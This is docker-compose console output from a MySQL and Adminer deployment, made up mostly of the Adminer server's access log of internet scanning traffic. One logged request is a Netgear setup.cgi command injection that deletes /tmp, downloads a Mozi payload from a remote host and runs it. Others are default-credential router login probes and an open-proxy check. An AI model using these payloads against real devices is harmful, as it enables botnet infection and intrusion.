Creating network "docker-compose_default" with the default driver
Creating docker-compose_adminer_container_1 ... 
Creating docker-compose_mysql_db_container_1 ... 
[1A[2KCreating docker-compose_mysql_db_container_1 ... [32mdone[0m[1B[2A[2KCreating docker-compose_adminer_container_1  ... [32mdone[0m[2BAttaching to docker-compose_mysql_db_container_1, docker-compose_adminer_container_1
[33mmysql_db_container_1  |[0m 2021-12-07 20:09:00+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.27-1debian10 started.
[36madminer_container_1   |[0m [Wed Dec  8 03:18:04 2021] [::ffff:139.162.145.250]:48512 Closing
[36madminer_container_1   |[0m [Wed Dec  8 04:29:31 2021] [::ffff:193.118.53.210]:58310 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 04:29:31 2021] [::ffff:193.118.53.210]:58310 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 04:29:31 2021] [::ffff:193.118.53.210]:58310 Closing
[36madminer_container_1   |[0m [Wed Dec  8 04:33:55 2021] [::ffff:141.101.196.233]:8886 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 04:33:56 2021] [::ffff:141.101.196.233]:8886 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Wed Dec  8 04:33:56 2021] [::ffff:141.101.196.233]:8886 Closing
[36madminer_container_1   |[0m [Wed Dec  8 04:34:00 2021] [::ffff:141.101.196.233]:18886 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 04:34:01 2021] [::ffff:141.101.196.233]:18886 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Wed Dec  8 04:34:01 2021] [::ffff:141.101.196.233]:18886 Closing
[36madminer_container_1   |[0m [Wed Dec  8 04:34:05 2021] [::ffff:141.101.196.233]:30426 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 04:34:05 2021] [::ffff:141.101.196.233]:30426 [200]: POST http://fingerprints.bablosoft.com/ip?Z73413400670Q1
[36madminer_container_1   |[0m [Wed Dec  8 04:34:05 2021] [::ffff:141.101.196.233]:30426 Closing
[36madminer_container_1   |[0m [Wed Dec  8 04:34:06 2021] [::ffff:141.101.196.233]:31506 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 04:34:07 2021] [::ffff:141.101.196.233]:31506 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Wed Dec  8 04:34:07 2021] [::ffff:141.101.196.233]:31506 Closing
[36madminer_container_1   |[0m [Wed Dec  8 04:55:30 2021] [::ffff:185.216.140.6]:52770 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 04:55:30 2021] [::ffff:185.216.140.6]:52770 Invalid request (Unsupported SSL request)
[36madminer_container_1   |[0m [Wed Dec  8 04:55:30 2021] [::ffff:185.216.140.6]:52770 Closing
[36madminer_container_1   |[0m [Wed Dec  8 04:57:42 2021] [::ffff:185.216.140.6]:51974 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 04:57:42 2021] [::ffff:185.216.140.6]:51974 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 04:57:42 2021] [::ffff:185.216.140.6]:51974 Closing
[36madminer_container_1   |[0m [Wed Dec  8 06:33:22 2021] [::ffff:193.118.53.202]:36912 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 06:33:22 2021] [::ffff:193.118.53.202]:36912 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 06:33:22 2021] [::ffff:193.118.53.202]:36912 Closing
[36madminer_container_1   |[0m [Wed Dec  8 07:00:09 2021] [::ffff:82.200.86.222]:41452 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 07:00:09 2021] [::ffff:82.200.86.222]:41452 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 07:00:09 2021] [::ffff:82.200.86.222]:41452 Closing
[36madminer_container_1   |[0m [Wed Dec  8 07:13:50 2021] [::ffff:139.59.235.12]:36658 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 07:13:50 2021] [::ffff:139.59.235.12]:36658 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 07:13:50 2021] [::ffff:139.59.235.12]:36658 Closing
[36madminer_container_1   |[0m [Wed Dec  8 07:49:40 2021] [::ffff:113.31.125.232]:39360 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 07:49:40 2021] [::ffff:113.31.125.232]:39360 Invalid request (Unsupported SSL request)
[36madminer_container_1   |[0m [Wed Dec  8 07:49:40 2021] [::ffff:113.31.125.232]:39360 Closing
[36madminer_container_1   |[0m [Wed Dec  8 07:49:40 2021] [::ffff:113.31.125.232]:39618 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 07:49:40 2021] [::ffff:113.31.125.232]:39618 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 07:49:40 2021] [::ffff:113.31.125.232]:39618 Closing
[36madminer_container_1   |[0m [Wed Dec  8 07:50:34 2021] [::ffff:113.31.102.176]:23996 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 07:50:34 2021] [::ffff:113.31.102.176]:23996 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 07:50:34 2021] [::ffff:113.31.102.176]:23996 Closing
[36madminer_container_1   |[0m [Wed Dec  8 07:50:34 2021] [::ffff:113.31.102.176]:24490 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 07:50:34 2021] [::ffff:113.31.102.176]:24490 [200]: GET /?file=favicon.ico&amp;version=4.8.1
[36madminer_container_1   |[0m [Wed Dec  8 07:50:34 2021] [::ffff:113.31.102.176]:24490 Closing
[36madminer_container_1   |[0m [Wed Dec  8 08:03:33 2021] [::ffff:167.248.133.42]:45826 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 08:03:34 2021] [::ffff:167.248.133.42]:45826 Invalid request (Connection reset by peer)
[36madminer_container_1   |[0m [Wed Dec  8 08:03:34 2021] [::ffff:167.248.133.42]:45826 Closing
[36madminer_container_1   |[0m [Wed Dec  8 08:03:34 2021] [::ffff:167.248.133.42]:60108 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 08:03:35 2021] [::ffff:167.248.133.42]:60108 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 08:03:35 2021] [::ffff:167.248.133.42]:60108 Closing
[36madminer_container_1   |[0m [Wed Dec  8 08:03:35 2021] [::ffff:167.248.133.42]:47726 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 08:03:35 2021] [::ffff:167.248.133.42]:47726 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 08:03:35 2021] [::ffff:167.248.133.42]:47726 Closing
[36madminer_container_1   |[0m [Wed Dec  8 11:16:49 2021] [::ffff:161.35.90.199]:54508 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 11:16:49 2021] [::ffff:161.35.90.199]:54508 Invalid request (Unsupported SSL request)
[36madminer_container_1   |[0m [Wed Dec  8 11:16:49 2021] [::ffff:161.35.90.199]:54508 Closing
[36madminer_container_1   |[0m [Wed Dec  8 11:32:42 2021] [::ffff:46.98.122.153]:4435 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 11:32:42 2021] [::ffff:46.98.122.153]:4435 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 11:32:42 2021] [::ffff:46.98.122.153]:4435 Closing
[36madminer_container_1   |[0m [Wed Dec  8 11:51:51 2021] [::ffff:192.241.214.79]:33588 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 11:51:51 2021] [::ffff:192.241.214.79]:33588 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 11:51:51 2021] [::ffff:192.241.214.79]:33588 Closing
[36madminer_container_1   |[0m [Wed Dec  8 14:36:33 2021] [::ffff:185.180.143.8]:38444 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 14:36:34 2021] [::ffff:185.180.143.8]:38444 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 14:36:34 2021] [::ffff:185.180.143.8]:38444 Closing
[36madminer_container_1   |[0m [Wed Dec  8 15:22:49 2021] [::ffff:101.0.49.27]:53243 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 15:22:54 2021] [::ffff:101.0.49.27]:53243 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Wed Dec  8 15:22:54 2021] [::ffff:101.0.49.27]:53243 Closing
[36madminer_container_1   |[0m [Wed Dec  8 16:17:32 2021] [::ffff:45.137.23.246]:58468 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 16:17:32 2021] [::ffff:45.137.23.246]:58468 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 16:17:32 2021] [::ffff:45.137.23.246]:58468 Closing
[36madminer_container_1   |[0m [Wed Dec  8 16:19:42 2021] [::ffff:87.251.75.40]:63142 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 16:19:42 2021] [::ffff:87.251.75.40]:63142 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Wed Dec  8 16:19:42 2021] [::ffff:87.251.75.40]:63142 Closing
[36madminer_container_1   |[0m [Wed Dec  8 16:56:00 2021] [::ffff:182.116.38.214]:49462 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 16:56:01 2021] [::ffff:182.116.38.214]:49462 [404]: GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.116.38.214:51244/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 - No such file or directory
[36madminer_container_1   |[0m [Wed Dec  8 16:56:01 2021] [::ffff:182.116.38.214]:49462 Closing
[36madminer_container_1   |[0m [Wed Dec  8 16:58:09 2021] [::ffff:186.33.68.55]:38027 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 16:58:09 2021] [::ffff:186.33.68.55]:38027 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 16:58:09 2021] [::ffff:186.33.68.55]:38027 Closing
[36madminer_container_1   |[0m [Wed Dec  8 17:29:28 2021] [::ffff:181.81.246.158]:38376 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 17:29:28 2021] [::ffff:181.81.246.158]:38376 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 17:29:28 2021] [::ffff:181.81.246.158]:38376 Closing
[36madminer_container_1   |[0m [Wed Dec  8 17:37:30 2021] [::ffff:142.93.163.195]:39390 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 17:37:30 2021] [::ffff:142.93.163.195]:39390 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 17:37:30 2021] [::ffff:142.93.163.195]:39390 Closing
[36madminer_container_1   |[0m [Wed Dec  8 19:19:27 2021] [::ffff:94.232.43.63]:20735 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 19:19:27 2021] [::ffff:94.232.43.63]:20735 Invalid request (Connection reset by peer)
[36madminer_container_1   |[0m [Wed Dec  8 19:19:27 2021] [::ffff:94.232.43.63]:20735 Closing
[36madminer_container_1   |[0m [Wed Dec  8 19:19:27 2021] [::ffff:94.232.43.63]:22585 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 19:19:27 2021] [::ffff:94.232.43.63]:22585 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Wed Dec  8 19:19:27 2021] [::ffff:94.232.43.63]:22585 Closing
[36madminer_container_1   |[0m [Wed Dec  8 19:19:28 2021] [::ffff:94.232.43.63]:26660 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 19:19:28 2021] [::ffff:94.232.43.63]:26660 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Wed Dec  8 19:19:28 2021] [::ffff:94.232.43.63]:26660 Closing
[36madminer_container_1   |[0m [Wed Dec  8 19:54:44 2021] [::ffff:119.5.48.234]:51820 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 19:54:44 2021] [::ffff:119.5.48.234]:51820 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 19:54:44 2021] [::ffff:119.5.48.234]:51820 Closing
[36madminer_container_1   |[0m [Wed Dec  8 20:16:03 2021] [::ffff:128.1.248.26]:60928 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 20:16:03 2021] [::ffff:128.1.248.26]:60928 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 20:16:03 2021] [::ffff:128.1.248.26]:60928 Closing
[36madminer_container_1   |[0m [Wed Dec  8 20:37:16 2021] [::ffff:192.241.212.218]:48350 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 20:37:16 2021] [::ffff:192.241.212.218]:48350 [200]: GET /actuator/health
[36madminer_container_1   |[0m [Wed Dec  8 20:37:16 2021] [::ffff:192.241.212.218]:48350 Closing
[36madminer_container_1   |[0m [Wed Dec  8 20:51:08 2021] [::ffff:109.162.198.242]:53094 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 20:51:08 2021] [::ffff:109.162.198.242]:53093 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 20:51:08 2021] [::ffff:109.162.198.242]:53094 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 20:51:08 2021] [::ffff:109.162.198.242]:53094 Closing
[36madminer_container_1   |[0m [Wed Dec  8 20:51:08 2021] [::ffff:109.162.198.242]:53093 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 20:51:08 2021] [::ffff:109.162.198.242]:53093 Closing
[36madminer_container_1   |[0m [Wed Dec  8 22:22:41 2021] [::ffff:186.33.88.207]:32913 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 22:22:41 2021] [::ffff:186.33.88.207]:32913 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 22:22:41 2021] [::ffff:186.33.88.207]:32913 Closing
[36madminer_container_1   |[0m [Wed Dec  8 22:22:41 2021] [::ffff:186.33.88.207]:32914 Accepted
[36madminer_container_1   |[0m [Wed Dec  8 22:22:41 2021] [::ffff:186.33.88.207]:32914 [200]: GET /
[36madminer_container_1   |[0m [Wed Dec  8 22:22:41 2021] [::ffff:186.33.88.207]:32914 Closing
[36madminer_container_1   |[0m [Thu Dec  9 00:07:41 2021] [::ffff:74.82.47.3]:52176 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 00:07:41 2021] [::ffff:74.82.47.3]:52176 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 00:07:41 2021] [::ffff:74.82.47.3]:52176 Closing
[36madminer_container_1   |[0m [Thu Dec  9 00:36:51 2021] [::ffff:128.1.248.42]:33710 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 00:36:51 2021] [::ffff:128.1.248.42]:33710 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 00:36:51 2021] [::ffff:128.1.248.42]:33710 Closing
[36madminer_container_1   |[0m [Thu Dec  9 02:16:34 2021] [::ffff:103.203.57.9]:55710 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 02:16:34 2021] [::ffff:103.203.57.9]:55710 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 02:16:34 2021] [::ffff:103.203.57.9]:55710 Closing
[36madminer_container_1   |[0m [Thu Dec  9 04:17:11 2021] [::ffff:81.163.40.160]:39514 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 04:17:11 2021] [::ffff:81.163.40.160]:39514 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 04:17:11 2021] [::ffff:81.163.40.160]:39514 Closing
[36madminer_container_1   |[0m [Thu Dec  9 04:27:11 2021] [::ffff:186.33.80.23]:56239 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 04:27:11 2021] [::ffff:186.33.80.23]:56239 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 04:27:11 2021] [::ffff:186.33.80.23]:56239 Closing
[36madminer_container_1   |[0m [Thu Dec  9 04:41:03 2021] [::ffff:162.221.192.26]:47202 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 04:41:03 2021] [::ffff:162.221.192.26]:47202 [200]: GET /login
[36madminer_container_1   |[0m [Thu Dec  9 04:41:03 2021] [::ffff:162.221.192.26]:47202 Closing
[36madminer_container_1   |[0m [Thu Dec  9 04:44:05 2021] [::ffff:222.188.67.159]:42704 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 04:44:07 2021] [::ffff:222.188.67.159]:42704 [403]: GET /boaform/admin/formLogin?username=ec8&psd=ec8
[36madminer_container_1   |[0m [Thu Dec  9 04:44:07 2021] [::ffff:222.188.67.159]:42704 Closing
[36madminer_container_1   |[0m [Thu Dec  9 05:38:55 2021] [::ffff:163.142.52.12]:8867 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 05:38:55 2021] [::ffff:163.142.52.12]:8867 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Thu Dec  9 05:38:55 2021] [::ffff:163.142.52.12]:8867 Closing
[36madminer_container_1   |[0m [Thu Dec  9 06:24:25 2021] [::ffff:185.204.1.186]:60775 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 06:24:26 2021] [::ffff:185.204.1.186]:60854 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 06:24:26 2021] [::ffff:185.204.1.186]:60775 Closed without sending a request; it was probably just an unused speculative preconnection
[36madminer_container_1   |[0m [Thu Dec  9 06:24:27 2021] [::ffff:185.204.1.186]:60775 Closing
[36madminer_container_1   |[0m [Thu Dec  9 06:29:40 2021] [::ffff:185.204.1.186]:60854 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 06:29:42 2021] [::ffff:185.204.1.186]:60854 Closing
[36madminer_container_1   |[0m [Thu Dec  9 06:29:43 2021] [::ffff:185.204.1.186]:64110 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 06:31:30 2021] [::ffff:185.204.1.186]:64110 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 06:31:30 2021] [::ffff:185.204.1.186]:64110 Closing
[36madminer_container_1   |[0m [Thu Dec  9 07:13:10 2021] [::ffff:139.59.235.12]:47386 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 07:13:10 2021] [::ffff:139.59.235.12]:47386 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 07:13:10 2021] [::ffff:139.59.235.12]:47386 Closing
[36madminer_container_1   |[0m [Thu Dec  9 07:39:07 2021] [::ffff:46.174.191.28]:38364 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 07:39:09 2021] [::ffff:46.174.191.28]:38364 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 07:39:09 2021] [::ffff:46.174.191.28]:38364 Closing
[36madminer_container_1   |[0m [Thu Dec  9 08:38:25 2021] [::ffff:116.68.110.138]:12362 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 08:38:29 2021] [::ffff:116.68.110.138]:12362 [403]: GET /boaform/admin/formLogin?username=user&psd=user
[36madminer_container_1   |[0m [Thu Dec  9 08:38:29 2021] [::ffff:116.68.110.138]:12362 Closing
[36madminer_container_1   |[0m [Thu Dec  9 10:23:28 2021] [::ffff:46.174.191.30]:38364 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 10:23:30 2021] [::ffff:46.174.191.30]:38364 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 10:23:30 2021] [::ffff:46.174.191.30]:38364 Closing
[36madminer_container_1   |[0m [Thu Dec  9 10:58:04 2021] [::ffff:183.136.225.9]:15445 Accepted
